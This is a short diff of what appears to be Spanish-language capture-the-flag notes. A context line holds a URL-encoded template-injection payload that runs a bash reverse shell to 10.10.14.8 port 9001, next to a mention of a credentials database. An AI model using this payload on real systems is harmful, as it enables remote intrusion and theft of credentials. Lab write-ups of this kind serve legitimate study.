@@ -53,3 +53,10 @@ de esta manera podemos tener acceso
 test%0A<%25%3d+system("bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.8/9001+0>%261'")+%25>
 
 pupilpath_credentials.db
+
+
+
+
+
+### sqlite3
+![[Pasted image 20240304130045.png]]
